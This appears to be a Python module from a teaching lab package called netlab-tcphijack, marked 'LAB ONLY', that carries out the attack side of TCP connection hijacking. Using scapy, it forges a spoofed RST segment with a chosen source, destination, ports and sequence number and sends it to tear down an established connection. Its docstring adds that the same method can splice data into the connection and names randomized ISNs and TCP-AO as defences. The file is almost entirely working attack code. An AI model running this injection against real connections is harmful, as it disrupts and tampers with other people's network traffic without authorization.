# SPDX-License-Identifier: MIT
# Copyright (c) 2026 Chris <goabonga@pm.me>

"""Attack side of netlab-tcphijack: inject a RST into a TCP connection. LAB ONLY.

Forges a RST (or data) segment with a guessed sequence number for an established
connection; a sequence that lands in the window tears the connection down or
splices data in. Randomized ISNs and TCP-AO (see session.py) raise the bar.
"""

from __future__ import annotations

import argparse

from netlab_core import verdict
from netlab_core.sniffing import load_scapy


def run(args: argparse.Namespace) -> int:
    s = load_scapy()
    rst = s.IP(src=args.src, dst=args.dst) / s.TCP(
        sport=args.sport, dport=args.dport, flags="R", seq=args.seq
    )
    print(f"[*] injecting RST {args.src}:{args.sport} -> {args.dst}:{args.dport} seq={args.seq}")
    s.send(rst, count=args.count, verbose=0)
    verdict("ALERT", f"RST injected with seq {args.seq}")
    return 0
